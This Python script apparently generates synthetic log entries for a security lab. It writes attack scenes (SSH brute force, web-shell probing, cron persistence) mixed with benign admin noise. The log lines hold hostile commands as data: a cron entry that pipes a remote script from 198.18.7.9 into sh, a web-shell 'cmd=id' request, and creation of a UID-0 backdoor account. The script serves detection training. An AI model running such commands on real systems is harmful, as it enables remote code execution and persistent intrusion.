import argparse
import os
import random
import time
from datetime import datetime, timezone
from pathlib import Path

LOG_DIR = Path(os.getenv("LOG_DIR", "/var/log/lab"))
HOST = os.getenv("LAB_HOST", "victim01")
ATTACKER = "203.0.113.45"
INTERNAL = "10.10.4.22"


def syslog_stamp() -> str:
    return datetime.now().strftime("%b %e %H:%M:%S").replace("  ", "  ")


def apache_stamp() -> str:
    return datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")


def write(name: str, lines: list[str], gap: float = 0.4) -> None:
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    path = LOG_DIR / name
    with path.open("a", encoding="utf-8") as fh:
        for line in lines:
            fh.write(line + "\n")
            fh.flush()
            time.sleep(gap)


def auth(message: str) -> str:
    return f"{syslog_stamp()} {HOST} {message}"


def scene_ssh_bruteforce_success() -> None:
    users = ["admin", "oracle", "test", "ubuntu", "postgres", "git", "jenkins", "backup"]
    lines = [
        auth(
            f"sshd[{random.randint(2000, 9000)}]: Failed password for invalid user {u} "
            f"from {ATTACKER} port {random.randint(40000, 60000)} ssh2"
        )
        for u in users
    ]
    lines += [
        auth(f"sshd[9412]: Failed password for backup from {ATTACKER} port 51002 ssh2"),
        auth(f"sshd[9412]: Accepted password for backup from {ATTACKER} port 51044 ssh2"),
        auth("sshd[9412]: pam_unix(sshd:session): session opened for user backup by (uid=0)"),
        auth("sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash"),
        auth("useradd[9530]: new user: name=svc_update, UID=0, GID=0, home=/home/svc_update, shell=/bin/bash"),
        auth("passwd[9533]: password changed for svc_update"),
    ]
    write("auth.log", lines)


def scene_ssh_noise() -> None:
    source = f"198.51.100.{random.randint(2, 250)}"
    lines = [
        auth(
            f"sshd[{random.randint(2000, 9000)}]: Failed password for invalid user {u} "
            f"from {source} port {random.randint(40000, 60000)} ssh2"
        )
        for u in random.sample(["root", "admin", "pi", "user"], 3)
    ]
    write("auth.log", lines)


def scene_web_shell() -> None:
    probes = [
        ("GET /wp-login.php HTTP/1.1", 404),
        ("GET /admin/config.php HTTP/1.1", 404),
        ("GET /.env HTTP/1.1", 404),
        ("GET /phpmyadmin/index.php HTTP/1.1", 404),
        ("GET /cgi-bin/test.cgi HTTP/1.1", 404),
        ("POST /uploads/thumb.php HTTP/1.1", 200),
        ("GET /uploads/thumb.php?cmd=id HTTP/1.1", 200),
    ]
    lines = [
        f'{ATTACKER} - - [{apache_stamp()}] "{req}" {code} {random.randint(180, 900)} "-" "curl/8.5.0"'
        for req, code in probes
    ]
    write("access.log", lines)


def scene_admin_maintenance() -> None:
    lines = [
        auth(f"sshd[4102]: Accepted publickey for natali from {INTERNAL} port 49221 ssh2: RSA SHA256:9Qk"),
        auth("sshd[4102]: pam_unix(sshd:session): session opened for user natali by (uid=0)"),
        auth("sudo: natali : TTY=pts/0 ; PWD=/home/natali ; USER=root ; COMMAND=/usr/bin/apt-get upgrade -y"),
        auth("sudo: pam_unix(sudo:session): session opened for user root by natali(uid=1000)"),
    ]
    write("auth.log", lines)
    write(
        "syslog",
        [
            auth("systemd[1]: Reloading nginx.service - A high performance web server."),
            auth("systemd[1]: Finished apt-daily-upgrade.service - Daily apt upgrade and clean activities."),
        ],
    )


def scene_cron_persistence() -> None:
    write(
        "syslog",
        [
            auth("crontab[7781]: (svc_update) BEGIN EDIT (svc_update)"),
            auth("crontab[7781]: (svc_update) REPLACE (svc_update)"),
            auth("crontab[7781]: (svc_update) END EDIT (svc_update)"),
            auth("CRON[7802]: (svc_update) CMD (curl -s http://198.18.7.9/p.sh | sh)"),
        ],
    )


def scene_backup_failure() -> None:
    write(
        "syslog",
        [
            auth("CRON[3310]: (root) CMD (/usr/local/bin/backup.sh >/dev/null)"),
            auth("backup.sh[3311]: rsync: connection unexpectedly closed (0 bytes received)"),
            auth("backup.sh[3311]: error: backup run failed with status 12"),
        ],
    )


SCENES = {
    "ssh_bruteforce_success": (scene_ssh_bruteforce_success, 2),
    "ssh_noise": (scene_ssh_noise, 4),
    "web_shell": (scene_web_shell, 2),
    "admin_maintenance": (scene_admin_maintenance, 4),
    "cron_persistence": (scene_cron_persistence, 1),
    "backup_failure": (scene_backup_failure, 3),
}


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--loop", action="store_true")
    parser.add_argument("--scene", choices=sorted(SCENES))
    parser.add_argument("--interval", type=int, default=int(os.getenv("SCENE_INTERVAL", "90")))
    args = parser.parse_args()

    if args.scene:
        SCENES[args.scene][0]()
        return

    names = list(SCENES)
    weights = [SCENES[n][1] for n in names]
    while True:
        name = random.choices(names, weights=weights)[0]
        print(f"[{datetime.now().isoformat(timespec='seconds')}] scene {name}", flush=True)
        SCENES[name][0]()
        if not args.loop:
            return
        time.sleep(args.interval + random.randint(-15, 15))


if __name__ == "__main__":
    main()
